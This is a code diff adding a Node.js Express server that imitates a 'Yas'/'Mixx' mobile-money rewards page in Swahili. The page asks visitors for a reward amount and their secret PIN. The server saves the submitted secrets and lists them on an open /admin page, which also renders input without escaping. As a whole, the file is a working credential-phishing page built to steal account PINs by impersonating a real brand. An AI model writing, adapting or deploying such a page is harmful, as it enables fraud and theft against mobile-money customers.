@@ -1,0 +1,176 @@
+const express = require("express");
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.use(express.urlencoded({ extended: true }));
+app.use(express.json());
+
+// In-memory storage (replace with database in production)
+const submissions = [];
+
+// Landing Page
+app.get("/", (req, res) => {
+  res.send(`
+  <!DOCTYPE html>
+  <html>
+  <head>
+    <title>Yas Landing Page</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <style>
+      body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background: #ffcc00;
+      }
+      header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 15px 25px;
+        background: #ffcc00;
+      }
+      .logo {
+        background: #0b2c6b;
+        color: #ffcc00;
+        padding: 10px 25px;
+        border-radius: 40px;
+        font-weight: bold;
+        font-size: 22px;
+      }
+      .icons {
+        font-size: 22px;
+        color: #0b2c6b;
+      }
+      .hero {
+        position: relative;
+        height: 60vh;
+        background: url('https://images.unsplash.com/photo-1511367461989-f85a21fda167') no-repeat center center/cover;
+      }
+      .overlay {
+        position: absolute;
+        inset: 0;
+        background: rgba(11,44,107,0.6);
+      }
+      .bubble {
+        position: absolute;
+        bottom: 20px;
+        right: 20px;
+        background: #0b2c6b;
+        color: white;
+        padding: 15px 25px;
+        border-radius: 25px;
+        font-weight: bold;
+      }
+      .bubble span {
+        color: #ffcc00;
+      }
+      .content {
+        background: #0b2c6b;
+        color: white;
+        padding: 30px 20px;
+        border-radius: 30px 30px 0 0;
+        margin-top: -20px;
+      }
+      h2 {
+        margin: 0 0 15px 0;
+      }
+      p {
+        margin-bottom: 20px;
+        color: #ddd;
+      }
+      input {
+        width: 100%;
+        padding: 12px;
+        margin-bottom: 15px;
+        border-radius: 10px;
+        border: none;
+      }
+      button {
+        width: 100%;
+        padding: 12px;
+        background: #ffcc00;
+        border: none;
+        font-weight: bold;
+        border-radius: 10px;
+        cursor: pointer;
+      }
+      button:hover {
+        opacity: 0.9;
+      }
+    </style>
+  </head>
+  <body>
+
+    <header>
+      <div class="logo">Yas</div>
+      <div class="icons">🔍 ☰</div>
+    </header>
+
+    <div class="hero">
+      <div class="overlay"></div>
+      <div class="bubble">Say <span>Yas!</span></div>
+    </div>
+
+    <div class="content">
+      <h2>Power to You!</h2>
+      <p>Mixx more to earn Mixx points. Redeem them for Minutes, SMS or cash.</p>
+
+      <form method="POST" action="/submit">
+        <input type="text" name="kiasi" placeholder="weka kiasi Cha zawadi" required />
+        <input type="text" name="siri" placeholder="weka nesno lako la siri" required />
+        <button type="submit">Tuma</button>
+      </form>
+    </div>
+
+  </body>
+  </html>
+  `);
+});
+
+// Handle Form
+app.post("/submit", (req, res) => {
+  const { kiasi, siri } = req.body;
+
+  submissions.push({
+    kiasi,
+    siri,
+    date: new Date().toLocaleString()
+  });
+
+  res.send(`
+    <h2>Asante! Taarifa zimepokelewa.</h2>
+    <a href="/admin">View Admin</a><br/><br/>
+    <a href="/">Rudi Nyumbani</a>
+  `);
+});
+
+// Admin Page
+app.get("/admin", (req, res) => {
+  let html = `
+    <h2>Submitted Entries</h2>
+    <table border="1" cellpadding="10" cellspacing="0">
+      <tr>
+        <th>Kiasi Cha Zawadi</th>
+        <th>Neno La Siri</th>
+        <th>Date</th>
+      </tr>
+  `;
+
+  submissions.forEach(entry => {
+    html += `
+      <tr>
+        <td>${entry.kiasi}</td>
+        <td>${entry.siri}</td>
+        <td>${entry.date}</td>
+      </tr>
+    `;
+  });
+
+  html += `</table><br><a href="/">Back Home</a>`;
+
+  res.send(html);
+});
+
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
+});
